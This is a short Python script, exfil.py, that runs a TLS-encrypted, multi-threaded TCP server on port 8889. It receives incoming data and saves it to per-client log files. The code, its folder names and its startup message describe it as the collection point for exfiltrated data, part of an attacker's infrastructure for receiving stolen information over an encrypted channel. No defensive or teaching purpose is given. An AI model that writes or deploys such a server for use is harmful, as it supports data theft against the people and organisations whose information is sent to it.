# exfil.py
import socket
import ssl
import threading
import datetime
import os

host = '0.0.0.0'
port = 8889
LOG_DIR = 'exfil_logs'

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def decrypt(b):
    return b.decode().replace('\\n', '\n')

def receiveMessage(a, c):
    client_ip, client_port = a
    log_file = os.path.join(LOG_DIR, f"exfil_{client_ip}_{client_port}.log")

    with c:
        print(f"Connected to {a}, logging to {log_file}")
        while True:
            data = c.recv(1024)
            if not data:
                print(f"Disconnected from {a}")
                break

            try:
                response = decrypt(data)
            except Exception as e:
                print(f"[!] Error decoding response from {a}: {e}")
                break

            print(f"Received message from {a}")

            with open(log_file, 'a') as f:
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"--- Log entry at {timestamp} ---\n")
                f.write(response)
                f.write("\n\n")

# Create SSL context
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
    raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_socket.bind((host, port))
    raw_socket.listen()
    print(f"Starting the exfil server..")
    print(f"Listening on {host}:{port} (TLS)")

    with ssl_context.wrap_socket(raw_socket, server_side=True) as s:
        while True:
            c, a = s.accept()
            threading.Thread(target=receiveMessage, args=(a, c,), daemon=True).start()